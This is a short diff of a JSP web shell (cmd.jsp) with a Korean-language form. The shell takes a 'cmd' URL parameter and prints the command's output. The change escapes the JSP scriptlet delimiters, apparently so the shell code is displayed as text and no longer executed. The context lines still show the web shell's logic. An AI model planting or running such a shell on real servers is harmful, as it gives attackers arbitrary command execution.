@@ -19,7 +19,7 @@ example : /cmd.jsp?cmd=ls
 <input type="submit" value="전송">
 </form>
 
-<%
+&lt;%
 if (request.getParameter("cmd") != null)
 {
 	out.println("명령어 : " + request.getParameter("cmd") + "<br>");
@@ -43,7 +43,7 @@ if (request.getParameter("cmd") != null)
 		disr = br.readLine(); 
 	}
 }
-%>
+%&gt;
 </textarea>
 </body>
 </html>
